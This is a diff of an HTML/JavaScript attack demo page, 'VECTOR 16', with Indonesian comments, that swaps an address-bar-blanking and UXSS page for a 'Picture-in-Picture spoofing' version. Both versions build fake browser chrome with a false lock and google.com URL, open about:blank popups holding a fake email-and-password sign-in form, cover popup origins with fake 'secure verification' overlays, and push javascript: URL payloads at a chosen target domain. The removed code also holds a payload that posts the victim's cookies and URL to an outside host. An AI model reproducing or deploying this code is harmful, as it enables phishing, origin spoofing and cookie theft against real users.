@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>VECTOR 16 - BLANK ADDRESS BAR + UXSS</title>
+<title>VECTOR 16 - PiP Window Spoofing | Hide Origin Popup</title>
 <style>
     * {
         margin: 0;
@@ -22,10 +22,10 @@
         overflow-x: hidden;
     }
 
-    /* Fake browser window dengan address bar kosong */
+    /* Fake browser window */
     .browser-window {
         width: 100%;
-        max-width: 1100px;
+        max-width: 1000px;
         background: #ffffff;
         border-radius: 16px;
         overflow: hidden;
@@ -33,7 +33,7 @@
         border: 1px solid #333;
     }
 
-    /* Fake address bar - bisa dikosongkan */
+    /* Fake address bar */
     .fake-address-bar {
         background: #f1f3f4;
         padding: 10px 16px;
@@ -75,12 +75,6 @@
         display: flex;
         align-items: center;
         gap: 8px;
-        min-height: 36px;
-    }
-
-    .lock-icon {
-        font-size: 12px;
-        color: #5f6368;
     }
 
     .url-text {
@@ -88,21 +82,8 @@
         font-size: 14px;
         color: #202124;
         font-family: monospace;
-        background: transparent;
-        border: none;
-        outline: none;
     }
 
-    .url-text:empty:before {
-        content: "";
-    }
-
-    .secure-badge {
-        font-size: 11px;
-        color: #188038;
-    }
-
-    /* Content area */
     .content-area {
         position: relative;
         height: 550px;
@@ -127,7 +108,7 @@
 
     .vector-container {
         width: 90%;
-        max-width: 850px;
+        max-width: 800px;
         background: #111;
         border: 2px solid #ff3b30;
         border-radius: 20px;
@@ -185,16 +166,25 @@
         font-size: 22px;
     }
 
+    .btn-group {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+    }
+
     button {
         background: #ff3b30;
         color: white;
         border: none;
-        padding: 12px 20px;
+        padding: 12px 18px;
         border-radius: 10px;
         font-weight: bold;
         cursor: pointer;
         margin: 5px;
         transition: 0.1s;
+        flex: 1;
+        min-width: 180px;
     }
 
     button:hover {
@@ -203,15 +193,16 @@
         transform: scale(1.02);
     }
 
-    .btn-group {
-        display: flex;
-        gap: 10px;
-        flex-wrap: wrap;
-        margin-bottom: 20px;
+    .pip-btn {
+        background: #0066ff;
+    }
+
+    .uxss-btn {
+        background: #ff6600;
     }
 
     .log {
-        height: 180px;
+        height: 160px;
         overflow: auto;
         background: black;
         border: 1px solid #ff3b30;
@@ -232,31 +223,94 @@
         border-left-color: #00ffaa;
     }
 
-    .log-uxss {
-        color: #ff6600;
-        border-left-color: #ff6600;
+    .log-pip {
+        color: #ffcc00;
+        border-left-color: #ffcc00;
     }
 
     .status-bar {
         position: fixed;
         bottom: 10px;
         right: 10px;
-        background: #000000aa;
+        left: 10px;
+        background: #000000cc;
         backdrop-filter: blur(5px);
         border: 1px solid #ff3b30;
         border-radius: 20px;
-        padding: 5px 12px;
+        padding: 6px 12px;
         font-size: 9px;
         color: #00ffaa;
+        text-align: center;
         z-index: 10000;
-        font-family: monospace;
+    }
+
+    /* PiP Video Element (hidden) */
+    #pipVideo {
+        position: fixed;
+        bottom: -9999px;
+        left: -9999px;
+        width: 1px;
+        height: 1px;
+        opacity: 0;
+        pointer-events: none;
+    }
+
+    .pip-overlay {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        width: 320px;
+        background: #1a1a1a;
+        border: 2px solid #ff3b30;
+        border-radius: 12px;
+        overflow: hidden;
+        z-index: 9999;
+        box-shadow: 0 0 30px rgba(0,0,0,0.8);
+        transition: 0.2s;
+        cursor: move;
+    }
+
+    .pip-header {
+        background: #ff3b30;
+        padding: 8px 12px;
+        display: flex;
+        justify-content: space-between;
+        cursor: move;
+        color: white;
+        font-size: 12px;
+        font-weight: bold;
+    }
+
+    .pip-content {
+        padding: 15px;
+        background: #0a0a0a;
+        color: #00ffaa;
+        font-size: 11px;
+        text-align: center;
+    }
+
+    .pip-content iframe {
+        width: 100%;
+        height: 150px;
+        border: none;
+        background: white;
+        margin-top: 10px;
+    }
+
+    .close-pip {
+        background: none;
+        border: none;
+        color: white;
+        cursor: pointer;
+        font-size: 16px;
+        padding: 0 5px;
+        min-width: auto;
     }
 </style>
 </head>
 <body>
 
 <div class="browser-window">
-    <!-- FAKE ADDRESS BAR - BISA DIKOSONGKAN -->
     <div class="fake-address-bar">
         <div class="nav-buttons">
             <div class="nav-btn" onclick="fakeBack()">←</div>
@@ -264,58 +318,48 @@
             <div class="nav-btn" onclick="fakeRefresh()">↻</div>
         </div>
         <div class="url-container">
-            <span class="lock-icon" id="lockIcon">🔒</span>
-            <div class="url-text" id="fakeUrl" contenteditable="true" onclick="this.focus()"></div>
-            <span class="secure-badge" id="secureBadge"></span>
+            <span class="lock-icon">🔒</span>
+            <span class="url-text" id="fakeUrl">https://www.google.com</span>
+            <span class="secure-badge">| Aman</span>
         </div>
         <div class="nav-buttons">
-            <div class="nav-btn" onclick="openBookmark()">⭐</div>
-            <div class="nav-btn" onclick="openMenu()">⋮</div>
+            <div class="nav-btn" onclick="fakeMenu()">⋮</div>
         </div>
     </div>
 
     <div class="content-area">
-        <!-- Attacker Overlay -->
-        <div class="attacker-overlay" id="attackerOverlay">
+        <div class="attacker-overlay">
             <div class="vector-container">
-                <h1>⚡ VECTOR 16 - BLANK ADDRESS BAR ⚡</h1>
-                <div class="desc">Address Bar Spoofing | UXSS | No Origin Popup</div>
+                <h1>⚡ VECTOR 16 - PiP SPOOFING ⚡</h1>
+                <div class="desc">Picture-in-Picture Window menutupi Origin Popup New Tab</div>
 
                 <div class="warning-box">
-                    <b>🔥 TEKNIK TERBARU 🔥</b><br>
-                    ✅ Address bar <b>KOSONG / BLANK</b> (about:blank hilang)<br>
-                    ✅ Delay popup <b>tanpa origin</b> muncul di new tab domain lain<br>
-                    ✅ UXSS injection via <b>javascript: protocol + window.open delay chain</b>
+                    <b>🔥 TEKNIK PiP SPOOFING 🔥</b><br>
+                    ✅ PiP window muncul di atas popup tab<br>
+                    ✅ Menutupi origin/address bar popup<br>
+                    ✅ UXSS injection via delayed popup + PiP overlay<br>
+                    ✅ Korban hanya melihat PiP window, bukan origin sebenarnya
                 </div>
 
                 <div class="stats">
-                    <div class="stat-card">
-                        <h3 id="statPopup">0</h3>
-                        <span>No-Origin Popups</span>
-                    </div>
-                    <div class="stat-card">
-                        <h3 id="statUXSS">0</h3>
-                        <span>UXSS Attempts</span>
-                    </div>
-                    <div class="stat-card">
-                        <h3 id="statStatus">🎯 READY</h3>
-                        <span>Status</span>
-                    </div>
+                    <div class="stat-card"><h3 id="pipCount">0</h3><span>PiP Windows</span></div>
+                    <div class="stat-card"><h3 id="popupCount">0</h3><span>Hidden Popups</span></div>
+                    <div class="stat-card"><h3 id="status">🎯 READY</h3><span>Status</span></div>
                 </div>
 
                 <div class="btn-group">
-                    <button onclick="clearAddressBar()">🗑️ HILANGKAN ADDRESS BAR TEXT</button>
-                    <button onclick="spoofAboutBlank()">📄 SPOOF about:blank (kosong)</button>
+                    <button class="pip-btn" onclick="createPipOverlay()">🖼️ CREATE PiP OVERLAY</button>
+                    <button class="pip-btn" onclick="spoofPipWithPopup()">🎭 PiP + HIDE POPUP ORIGIN</button>
                 </div>
 
                 <div class="btn-group">
-                    <button onclick="uxssDelayPopup()" style="background:#ff6600">🌐 UXSS + DELAY POPUP (NO ORIGIN)</button>
-                    <button onclick="uxssCrossDomainInject()" style="background:#aa00ff">🎯 UXSS CROSS-DOMAIN INJECT</button>
+                    <button class="uxss-btn" onclick="uxssWithPipSpoof()">🔥 UXSS + PiP SPOOF (NO ORIGIN)</button>
+                    <button onclick="hideOriginPopup()">🚫 HIDE ORIGIN POPUP</button>
                 </div>
 
                 <div class="btn-group">
-                    <button onclick="openNoOriginTab()">📌 BUKA TAB TANPA ORIGIN</button>
-                    <button onclick="resetSpoof()">🔄 RESET SPOOF</button>
+                    <button onclick="closeAllPip()">❌ CLOSE ALL PiP</button>
+                    <button onclick="resetAll()">🔄 RESET</button>
                 </div>
 
                 <div class="log" id="log"></div>
@@ -324,18 +368,21 @@
     </div>
 </div>
 
-<div class="status-bar" id="statusBar">🎯 READY | Address Bar: BLANK MODE</div>
+<div class="status-bar" id="statusBar">🎯 PiP Spoofing Ready | PiP menutupi origin popup</div>
+
+<!-- Hidden video element untuk PiP API -->
+<video id="pipVideo" src="data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQ..." muted autoplay loop></video>
 
 <script>
-let popupCount = 0;
-let uxssCount = 0;
-let spoofActive = false;
-let delayedWindows = [];
+let pipCount = 0;
+let hiddenPopupCount = 0;
+let activePips = [];
+let spoofedPopups = [];
 
 function addLog(msg, type = "") {
     const log = document.getElementById("log");
     const div = document.createElement("div");
-    div.className = "log-entry " + (type === "success" ? "log-success" : type === "uxss" ? "log-uxss" : "");
+    div.className = "log-entry " + (type === "success" ? "log-success" : type === "pip" ? "log-pip" : "");
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
@@ -343,295 +390,341 @@ function addLog(msg, type = "") {
 }
 
 function updateUI() {
-    document.getElementById("statPopup").innerText = popupCount;
-    document.getElementById("statUXSS").innerText = uxssCount;
+    document.getElementById("pipCount").innerText = pipCount;
+    document.getElementById("popupCount").innerText = hiddenPopupCount;
 }
 
-// ============ ADDRESS BAR SPOOFING - MENGHILANGKAN TEXT ============
-function clearAddressBar() {
-    const fakeUrlDiv = document.getElementById("fakeUrl");
-    const lockIcon = document.getElementById("lockIcon");
-    const secureBadge = document.getElementById("secureBadge");
+// ============ CREATE PiP OVERLAY (menutupi origin popup) ============
+function createPipOverlay(customContent = null) {
+    const pipDiv = document.createElement("div");
+    pipDiv.className = "pip-overlay";
+    pipDiv.id = `pip_${Date.now()}_${Math.random()}`;
     
-    // Kosongkan address bar
-    fakeUrlDiv.innerHTML = "";
-    fakeUrlDiv.setAttribute("data-spoofed", "true");
-    fakeUrlDiv.style.color = "#5f6368";
-    fakeUrlDiv.style.opacity = "0.6";
+    // Random position agar tidak terduga
+    const leftPos = Math.random() * (window.innerWidth - 350);
+    const topPos = Math.random() * (window.innerHeight - 250);
+    pipDiv.style.left = Math.max(10, leftPos) + "px";
+    pipDiv.style.top = Math.max(10, topPos) + "px";
+    pipDiv.style.right = "auto";
+    pipDiv.style.bottom = "auto";
     
-    // Hilangkan lock icon dan secure badge
-    lockIcon.innerHTML = "🔓";
-    lockIcon.style.opacity = "0.3";
-    secureBadge.innerHTML = "";
+    // Content PiP
+    const fakeDomain = ["google.com", "facebook.com", "youtube.com", "instagram.com", "twitter.com"][Math.floor(Math.random() * 5)];
     
-    spoofActive = true;
-    addLog("🗑️ Address bar menjadi KOSONG (about:blank hilang dari tampilan)", "success");
-    addLog("💡 Tips: Klik address bar lalu tekan Enter untuk reset", "success");
-    
-    document.getElementById("statusBar").innerHTML = "🎯 Address Bar: BLANK (spoofed) | about:blank hidden";
-}
-
-function spoofAboutBlank() {
-    const fakeUrlDiv = document.getElementById("fakeUrl");
-    fakeUrlDiv.innerHTML = "";
-    fakeUrlDiv.setAttribute("placeholder", " ");
-    fakeUrlDiv.style.color = "#9aa0a6";
-    
-    addLog("📄 Address bar SPOOFED menjadi blank/empty", "success");
-    addLog("⚠️ about:blank asli tidak terlihat - mirip seperti halaman kosong", "uxss");
-    
-    document.getElementById("statusBar").innerHTML = "🎯 Address Bar: EMPTY (about:blank hidden)";
-}
-
-function fakeBack() { addLog("◀ Back button (fake)", ""); }
-function fakeForward() { addLog("▶ Forward button (fake)", ""); }
-function fakeRefresh() { addLog("⟳ Refresh simulation", ""); location.reload(); }
-function openBookmark() { addLog("⭐ Bookmark (fake)", ""); }
-function openMenu() { addLog("⋮ Menu (fake)", ""); }
-
-function resetSpoof() {
-    const fakeUrlDiv = document.getElementById("fakeUrl");
-    const lockIcon = document.getElementById("lockIcon");
-    const secureBadge = document.getElementById("secureBadge");
-    
-    fakeUrlDiv.innerHTML = "https://www.google.com";
-    fakeUrlDiv.style.color = "#202124";
-    fakeUrlDiv.style.opacity = "1";
-    lockIcon.innerHTML = "🔒";
-    lockIcon.style.opacity = "1";
-    secureBadge.innerHTML = "| Aman";
-    spoofActive = false;
-    
-    addLog("🔄 Spoof reset - address bar kembali normal", "success");
-    document.getElementById("statusBar").innerHTML = "🎯 Address Bar: NORMAL";
-}
-
-// ============ UXSS + DELAY POPUP NO ORIGIN ============
-function uxssDelayPopup() {
-    addLog("🔥 [UXSS] Initiating delay popup with no-origin", "uxss");
-    addLog("📝 Teknik: javascript: protocol + about:blank chain + delayed window.open", "uxss");
-    
-    uxssCount++;
-    updateUI();
-    
-    // Payload UXSS untuk eksekusi di domain lain
-    const uxssPayload = `
-        alert('[VECTOR16] UXSS Executed!\\nCurrent Domain: ' + document.domain + '\\nOrigin: ' + location.origin);
-        fetch('https://httpbin.org/post', {
-            method: 'POST',
-            body: JSON.stringify({domain: document.domain, cookies: document.cookie, url: location.href})
-        }).catch(() => {});
-        console.log('[VECTOR16] UXSS injected to:', document.domain);
+    pipDiv.innerHTML = `
+        <div class="pip-header" onmousedown="startDrag(event, '${pipDiv.id}')">
+            <span>🎬 PiP Mode - ${fakeDomain}</span>
+            <button class="close-pip" onclick="closePip('${pipDiv.id}')">✕</button>
+        </div>
+        <div class="pip-content">
+            <div style="font-size:10px; color:#ff3b30;">🔒 Secure Connection</div>
+            <div style="font-size:9px; margin:5px 0;">https://${fakeDomain}</div>
+            ${customContent || '<iframe srcdoc="<html><body style=\'background:#fff;display:flex;justify-content:center;align-items:center\'><h3>Loading content...</h3></body></html>"></iframe>'}
+            <div style="margin-top:8px; font-size:9px;">▶ Playing ●●●</div>
+        </div>
     `;
     
-    // TECHNIQUE 1: Delayed window.open with javascript: protocol
-    addLog("💀 Technique 1: window.open dengan javascript: protocol + delay", "uxss");
+    document.body.appendChild(pipDiv);
+    activePips.push(pipDiv.id);
+    pipCount++;
+    updateUI();
     
+    addLog(`🖼️ PiP Overlay #${pipCount} created - menutupi area popup origin`, "pip");
+    return pipDiv.id;
+}
+
+// Drag functionality untuk PiP
+function startDrag(event, pipId) {
+    const pipDiv = document.getElementById(pipId);
+    if (!pipDiv) return;
+    
+    let startX = event.clientX;
+    let startY = event.clientY;
+    let startLeft = parseInt(pipDiv.style.left);
+    let startTop = parseInt(pipDiv.style.top);
+    
+    function onMouseMove(e) {
+        let dx = e.clientX - startX;
+        let dy = e.clientY - startY;
+        pipDiv.style.left = (startLeft + dx) + "px";
+        pipDiv.style.top = (startTop + dy) + "px";
+        pipDiv.style.right = "auto";
+        pipDiv.style.bottom = "auto";
+    }
+    
+    function onMouseUp() {
+        document.removeEventListener('mousemove', onMouseMove);
+        document.removeEventListener('mouseup', onMouseUp);
+    }
+    
+    document.addEventListener('mousemove', onMouseMove);
+    document.addEventListener('mouseup', onMouseUp);
+}
+
+function closePip(pipId) {
+    const pip = document.getElementById(pipId);
+    if (pip) {
+        pip.remove();
+        activePips = activePips.filter(id => id !== pipId);
+        addLog(`❌ PiP window closed`, "");
+    }
+}
+
+function closeAllPip() {
+    activePips.forEach(id => {
+        const pip = document.getElementById(id);
+        if (pip) pip.remove();
+    });
+    activePips = [];
+    addLog(`🗑️ All PiP windows closed`, "success");
+}
+
+// ============ PiP + HIDE POPUP ORIGIN ============
+function spoofPipWithPopup() {
+    addLog("🎭 [PiP SPOOF] Creating popup + PiP overlay to hide origin", "pip");
+    
+    // Step 1: Buat popup ke about:blank (no origin)
     setTimeout(() => {
         try {
-            const win = window.open(`javascript:${encodeURIComponent(uxssPayload)}`, "_blank");
-            if (win) {
-                popupCount++;
+            const hiddenPopup = window.open("about:blank", "_blank", "width=400,height=300");
+            if (hiddenPopup) {
+                hiddenPopupCount++;
                 updateUI();
-                addLog(`✅ UXSS popup opened (no origin) - Payload akan execute di new tab`, "success");
-                delayedWindows.push(win);
+                spoofedPopups.push(hiddenPopup);
+                
+                // Write content ke popup
+                hiddenPopup.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>Secure Login</title></head>
+                    <body style="background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial">
+                        <div style="background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
+                            <h2 style="color:#1a73e8">Sign in</h2>
+                            <input type="text" placeholder="Email" style="width:100%;padding:10px;margin:10px 0">
+                            <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:10px 0">
+                            <button style="background:#1a73e8;color:white;padding:10px;border:none;width:100%">Sign in</button>
+                        </div>
+                    </body>
+                    </html>
+                `);
+                hiddenPopup.document.close();
+                addLog(`📌 Hidden popup #${hiddenPopupCount} created (about:blank - no origin)`, "success");
+                
+                // Step 2: Buat PiP untuk menutupi popup
+                setTimeout(() => {
+                    const pipId = createPipOverlay(`
+                        <div style="font-size:10px; color:#00ffaa;">🔐 SECURE CONNECTION</div>
+                        <iframe srcdoc="
+                            <html>
+                            <body style='background:#1a1a1a;color:#00ffaa;padding:10px;font-family:monospace'>
+                                <div style='text-align:center'>
+                                    <h3 style='color:#ff3b30'>⚠️ VERIFICATION REQUIRED</h3>
+                                    <p>Please verify your identity</p>
+                                    <button style='background:#ff3b30;color:white;border:none;padding:8px 16px'>Verify Now</button>
+                                </div>
+                            </body>
+                            </html>
+                        "></iframe>
+                        <div style="margin-top:8px">https://secure-verify.com</div>
+                    `);
+                    
+                    // Posisikan PiP di atas popup
+                    setTimeout(() => {
+                        const pipDiv = document.getElementById(pipId);
+                        if (pipDiv && hiddenPopup) {
+                            pipDiv.style.zIndex = "10000";
+                            addLog(`🎭 PiP overlay positioned to HIDE origin of popup`, "pip");
+                        }
+                    }, 100);
+                }, 300);
             } else {
-                addLog("⚠️ Popup blocked - izinkan popup untuk UXSS", "warning");
+                addLog("⚠️ Popup blocked! Izinkan popup untuk teknik ini", "warning");
             }
         } catch(e) {
             addLog(`Error: ${e.message}`, "");
         }
-    }, 800);
+    }, 200);
     
-    // TECHNIQUE 2: about:blank + document.write (classic UXSS)
-    addLog("💀 Technique 2: about:blank + document.write injection", "uxss");
-    
+    document.getElementById("status").innerHTML = "🎭 SPOOFING";
     setTimeout(() => {
-        try {
-            const blankWin = window.open("about:blank", "_blank");
-            if (blankWin) {
-                popupCount++;
-                updateUI();
-                blankWin.document.write(`
-                    <html>
-                    <head><title>VECTOR16 UXSS</title></head>
-                    <body>
-                        <h1 style="color:red">VECTOR 16 - UXSS Injection</h1>
-                        <p>This page was injected via about:blank UXSS technique</p>
-                        <p>Current origin: <b id="origin"></b></p>
-                        <script>
-                            document.getElementById('origin').innerText = location.origin || 'null (no origin)';
-                            alert('[UXSS] about:blank injection success! Origin: ' + (location.origin || 'null'));
-                            console.log('VECTOR16 UXSS injected to about:blank');
-                        <\/script>
-                    </body>
-                    </html>
-                `);
-                blankWin.document.close();
-                addLog(`✅ about:blank UXSS injection success - no origin popup`, "success");
-            }
-        } catch(e) {
-            addLog(`about:blank injection failed: ${e.message}`, "");
-        }
-    }, 1500);
-    
-    // TECHNIQUE 3: Delay popup ke domain lain via javascript: redirect
-    addLog("💀 Technique 3: window.open ke domain lain dengan delayed execution", "uxss");
-    
-    setTimeout(() => {
-        const targetDomain = "https://www.google.com";
-        const injectCode = `
-            setTimeout(() => {
-                alert('[VECTOR16] UXSS on ' + document.domain);
-                document.body.style.border = '5px solid red';
-                var div = document.createElement('div');
-                div.style.cssText = 'position:fixed;top:0;left:0;background:red;color:white;z-index:99999;padding:10px;';
-                div.innerHTML = '⚠️ VECTOR 16 UXSS INJECTED ⚠️';
-                document.body.appendChild(div);
-            }, 1000);
-        `;
-        
-        try {
-            const win = window.open(`javascript:${encodeURIComponent(injectCode)}`, "_blank");
-            if (win) {
-                popupCount++;
-                updateUI();
-                addLog(`🎯 UXSS target: ${targetDomain} - popup opened`, "uxss");
-            }
-        } catch(e) {}
-    }, 2500);
-    
-    addLog("⏱️ Menunggu popup... (izinkan popup browser)", "info");
-    document.getElementById("statStatus").innerHTML = "🔥 UXSS FIRING";
-    setTimeout(() => {
-        document.getElementById("statStatus").innerHTML = "🎯 READY";
-    }, 5000);
+        document.getElementById("status").innerHTML = "🎯 READY";
+    }, 3000);
 }
 
-// ============ CROSS-DOMAIN UXSS INJECTION ============
-function uxssCrossDomainInject() {
-    addLog("🎯 [UXSS] Cross-domain injection attempt", "uxss");
-    addLog("Target: any domain via javascript: protocol + window.opener chain", "uxss");
+// ============ UXSS + PiP SPOOF (No Origin) ============
+function uxssWithPipSpoof() {
+    addLog("🔥 [UXSS + PiP] Launching UXSS with PiP origin hiding", "uxss");
     
-    uxssCount++;
-    updateUI();
-    
-    const targetDomain = prompt("Target domain untuk UXSS (contoh: https://www.google.com):", "https://www.google.com");
+    const targetDomain = prompt("Target domain untuk UXSS:", "https://www.google.com");
     if (!targetDomain) return;
     
     // Buat popup ke target domain
-    addLog(`📡 Opening popup to ${targetDomain}...`, "");
-    
     setTimeout(() => {
         try {
-            // Buka popup ke target
-            const targetWin = window.open(targetDomain, "_blank");
-            if (targetWin) {
-                popupCount++;
+            const uxssPopup = window.open(targetDomain, "_blank");
+            if (uxssPopup) {
+                hiddenPopupCount++;
                 updateUI();
-                addLog(`✅ Popup opened to ${targetDomain}`, "success");
+                addLog(`🌐 Popup opened to ${targetDomain}`, "success");
                 
-                // Delay untuk memastikan page loaded, lalu inject via javascript: URL
+                // Buat beberapa PiP untuk menutupi origin bar
+                for (let i = 0; i < 3; i++) {
+                    setTimeout(() => {
+                        const pipId = createPipOverlay(`
+                            <div style="font-size:10px;">
+                                <iframe srcdoc="
+                                    <html>
+                                    <body style='background:#0a0a0a;color:#00ffaa;text-align:center;padding:20px;font-family:monospace'>
+                                        <div style='border:1px solid #ff3b30;border-radius:10px;padding:15px'>
+                                            <h3>⚠️ VECTOR 16 UXSS</h3>
+                                            <p>Executing on: ${targetDomain}</p>
+                                            <button onclick='alert(\\"UXSS Executed on \\"+location.href)'>Test</button>
+                                        </div>
+                                    </body>
+                                    </html>
+                                "></iframe>
+                            </div>
+                        `);
+                        
+                        // Random position PiP di sekitar area address bar popup
+                        const pipDiv = document.getElementById(pipId);
+                        if (pipDiv) {
+                            pipDiv.style.position = "fixed";
+                            pipDiv.style.top = (10 + i * 80) + "px";
+                            pipDiv.style.right = "10px";
+                            pipDiv.style.left = "auto";
+                            pipDiv.style.bottom = "auto";
+                            pipDiv.style.zIndex = "99999";
+                        }
+                    }, 500 + (i * 200));
+                }
+                
+                // Inject UXSS payload via javascript: protocol
                 setTimeout(() => {
                     try {
-                        // UXSS payload untuk di-inject ke target domain
-                        const uxssCode = `
-                            (function() {
+                        const uxssPayload = `
+                            setTimeout(() => {
                                 alert('[VECTOR16] UXSS on ' + document.domain);
-                                var banner = document.createElement('div');
-                                banner.innerHTML = '🔥 VECTOR 16 UXSS - You\\'ve been hacked 🔥';
-                                banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;z-index:999999;text-align:center;padding:15px;font-size:18px;font-weight:bold';
-                                document.body.appendChild(banner);
-                                console.log('[VECTOR16] UXSS injected to', document.domain);
-                            })();
+                                var div = document.createElement('div');
+                                div.innerHTML = '🔥 VECTOR 16 UXSS INJECTED 🔥';
+                                div.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;z-index:999999;text-align:center;padding:10px';
+                                document.body.appendChild(div);
+                            }, 1000);
                         `;
-                        
-                        // Reload target window with javascript: payload
-                        targetWin.location.href = `javascript:${encodeURIComponent(uxssCode)}`;
-                        addLog(`🎯 UXSS payload injected to ${targetDomain}`, "uxss");
+                        uxssPopup.location.href = `javascript:${encodeURIComponent(uxssPayload)}`;
+                        addLog(`🎯 UXSS payload injected to ${targetDomain} (origin hidden by PiP)`, "uxss");
                     } catch(e) {
-                        addLog(`Cross-origin blocked: ${e.message}`, "");
-                        addLog("⚠️ UXSS via window.opener requires specific vulnerability", "");
+                        addLog(`UXSS injection failed: ${e.message}`, "");
                     }
-                }, 2000);
+                }, 1500);
+                
             } else {
-                addLog("❌ Popup blocked! Izinkan popup untuk UXSS", "warning");
+                addLog("❌ Popup blocked! Izinkan popup browser", "warning");
             }
         } catch(e) {
             addLog(`Error: ${e.message}`, "");
         }
     }, 500);
+    
+    document.getElementById("status").innerHTML = "🔥 UXSS FIRING";
+    setTimeout(() => {
+        document.getElementById("status").innerHTML = "🎯 READY";
+    }, 5000);
 }
 
-// ============ OPEN TAB WITHOUT ORIGIN ============
-function openNoOriginTab() {
-    addLog("📌 Opening tab with no origin (about:blank + null origin)", "");
+// ============ HIDE ORIGIN POPUP ============
+function hideOriginPopup() {
+    addLog("🚫 Creating multiple PiP windows to cover popup origins", "pip");
     
-    // Teknik: about:blank memiliki origin null
-    const blankWin = window.open("about:blank", "_blank");
-    if (blankWin) {
-        popupCount++;
+    // Buat fake popup terlebih dahulu
+    const fakePopup = window.open("about:blank", "_blank", "width=500,height=400");
+    if (fakePopup) {
+        hiddenPopupCount++;
         updateUI();
-        
-        blankWin.document.write(`
+        fakePopup.document.write(`
             <!DOCTYPE html>
             <html>
-            <head><title>No Origin Tab - VECTOR16</title></head>
-            <body style="background:#0a0a0a;color:#00ffaa;font-family:monospace;padding:20px">
-                <h1 style="color:#ff3b30">⚡ NO ORIGIN TAB ⚡</h1>
-                <p>This tab has <b>NO ORIGIN</b> (about:blank)</p>
-                <p>Origin: <span style="color:#ff6600" id="originInfo"></span></p>
-                <p>Address bar is BLANK (spoofed)</p>
-                <hr>
-                <h3>🔥 UXSS Test</h3>
-                <button onclick="alert('UXSS from no-origin tab! Origin: ' + (location.origin || 'null'))">Test Alert</button>
-                <script>
-                    document.getElementById('originInfo').innerText = location.origin || '(null)';
-                    console.log('No origin tab created by VECTOR16');
-                <\/script>
+            <head><title>Protected Content</title></head>
+            <body style="background:#fff">
+                <div style="padding:20px">
+                    <h2>Protected Page</h2>
+                    <p>This content is secured</p>
+                </div>
             </body>
             </html>
         `);
-        blankWin.document.close();
-        addLog("✅ Tab dengan NO ORIGIN created (about:blank)", "success");
-    } else {
-        addLog("⚠️ Popup blocked - izinkan popup", "warning");
-    }
-}
-
-// ============ ADDITIONAL UXSS TECHNIQUES ============
-function delayedNoOriginPopup() {
-    addLog("⏱️ Creating delayed no-origin popup...", "");
-    
-    setTimeout(() => {
-        const win = window.open("about:blank", "_blank");
-        if (win) {
-            popupCount++;
-            updateUI();
-            win.document.write("<h1>Delayed No-Origin Popup</h1><p>Created with delay technique</p>");
-            win.document.close();
-            addLog("✅ Delayed no-origin popup created", "success");
+        fakePopup.document.close();
+        addLog(`📌 Popup created - origin: about:blank (null)`, "success");
+        
+        // Buat 3-5 PiP untuk menutupi address bar popup
+        for (let i = 0; i < 4; i++) {
+            setTimeout(() => {
+                const pipId = createPipOverlay(`
+                    <div style="font-size:9px; text-align:center">
+                        🎬 Video Player
+                        <div style="background:#333;height:80px;margin:5px 0;display:flex;justify-content:center;align-items:center">
+                            ▶️ PLAYING
+                        </div>
+                        https://player.cdn.com
+                    </div>
+                `);
+                const pipDiv = document.getElementById(pipId);
+                if (pipDiv) {
+                    pipDiv.style.position = "fixed";
+                    pipDiv.style.top = (5 + i * 70) + "px";
+                    pipDiv.style.right = "5px";
+                    pipDiv.style.left = "auto";
+                    pipDiv.style.zIndex = "99999";
+                }
+            }, i * 150);
         }
-    }, 1000);
+        
+        addLog(`✅ ${pipCount} PiP windows created to HIDE popup origin bar`, "pip");
+    }
 }
 
-// Event listener untuk menangkap popup blocker
-window.addEventListener('beforeunload', function(e) {
-    if (popupCount > 0) {
-        e.returnValue = "UXSS popups active";
+// ============ REAL PICTURE-IN-PICTURE API (Browser Native) ============
+async function requestNativePip() {
+    const video = document.getElementById("pipVideo");
+    try {
+        if (video.requestPictureInPicture) {
+            await video.requestPictureInPicture();
+            addLog("📺 Native Picture-in-Picture activated", "pip");
+        } else {
+            addLog("⚠️ Native PiP not supported, using overlay instead", "");
+            createPipOverlay();
+        }
+    } catch(e) {
+        addLog(`PiP error: ${e.message}`, "");
+        createPipOverlay();
     }
-});
+}
+
+// ============ RESET ============
+function resetAll() {
+    closeAllPip();
+    spoofedPopups.forEach(popup => {
+        try { popup.close(); } catch(e) {}
+    });
+    spoofedPopups = [];
+    hiddenPopupCount = 0;
+    pipCount = 0;
+    updateUI();
+    addLog("🔄 All spoofing elements reset", "success");
+    document.getElementById("status").innerHTML = "🎯 READY";
+    document.getElementById("statusBar").innerHTML = "🎯 PiP Spoofing Reset | Ready";
+}
+
+function fakeBack() { addLog("◀ Back (fake)", ""); }
+function fakeForward() { addLog("▶ Forward (fake)", ""); }
+function fakeRefresh() { addLog("⟳ Refresh", ""); }
+function fakeMenu() { addLog("⋮ Menu", ""); }
 
 // Initial logs
-addLog("⚡ VECTOR 16 - BLANK ADDRESS BAR + UXSS LOADED", "success");
-addLog("📌 Address bar bisa dikosongkan (klik 'HILANGKAN ADDRESS BAR TEXT')", "");
-addLog("🌐 UXSS + Delay Popup: Membuka popup tanpa origin ke domain lain", "uxss");
-addLog("💡 Izinkan popup browser untuk UXSS maksimal", "info");
-
-// Auto-clear address bar on load? Optional
-setTimeout(() => {
-    addLog("💡 Tips: Gunakan 'HILANGKAN ADDRESS BAR TEXT' untuk spoofing", "");
-}, 1000);
+addLog("⚡ VECTOR 16 - PiP Window Spoofing LOADED", "success");
+addLog("🖼️ PiP overlay dapat menutupi origin popup new tab", "pip");
+addLog("💡 Gunakan 'PiP + HIDE POPUP ORIGIN' untuk demo", "");
+addLog("⚠️ Izinkan popup browser untuk hasil maksimal", "warning");
 </script>
 </body>
 </html>
